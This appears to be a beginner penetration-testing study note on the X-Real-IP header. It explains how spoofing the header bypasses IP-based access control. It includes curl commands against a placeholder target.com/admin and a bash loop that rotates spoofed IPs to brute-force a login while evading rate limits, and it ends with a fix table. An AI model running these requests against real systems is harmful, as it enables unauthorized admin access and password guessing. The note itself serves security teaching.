---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.05 X-Real-IP — IP Bypass"
---

# 03.05 — X-Real-IP

## What is it?

`X-Real-IP` is a non-standard header set by Nginx (and some other proxies) to pass the client's real IP address to the backend. Unlike `X-Forwarded-For`, it contains only one IP — the original client's IP.

---

## Common Usage

```
NGINX CONFIGURATION:
  proxy_set_header X-Real-IP $remote_addr;
  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

BACKEND SEES:
  X-Real-IP: 1.2.3.4           ← single IP (client)
  X-Forwarded-For: 1.2.3.4     ← may have proxy chain

WHICH TO TRUST?
  Neither if set by client! Only trust if the proxy sets it.
  Many apps check X-Real-IP first, then X-Forwarded-For as fallback.
```

---

## Attack: IP Bypass via X-Real-IP

```
If app uses X-Real-IP for access control:
  if X-Real-IP == '127.0.0.1': allow_admin()

BYPASS:
  X-Real-IP: 127.0.0.1   → admin access!
  X-Real-IP: 10.0.0.1    → "internal" request!

COMBINED BYPASS:
  Try multiple IP headers simultaneously:
  X-Real-IP: 127.0.0.1
  X-Forwarded-For: 127.0.0.1
  X-Client-IP: 127.0.0.1
  True-Client-IP: 127.0.0.1
```

---

## Testing

```bash
# Try admin access via X-Real-IP bypass
curl -H "X-Real-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Real-IP: 192.168.1.1" https://target.com/admin

# Rate limit bypass
for i in $(seq 1 100); do
  curl -X POST https://target.com/login \
    -H "X-Real-IP: 10.10.10.$i" \
    -d "user=admin&pass=test$i" -s -o /dev/null -w "%{http_code}\n"
done
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| X-Real-IP trusted for access control | Use only real connection IP; strip client-supplied headers |
| Rate limiting by X-Real-IP | Rate limit by authenticated session |

---

## Related Notes
- [[02 - X-Forwarded-For]] — similar IP bypass header
- [[10 - True-Client-IP]] — Cloudflare equivalent
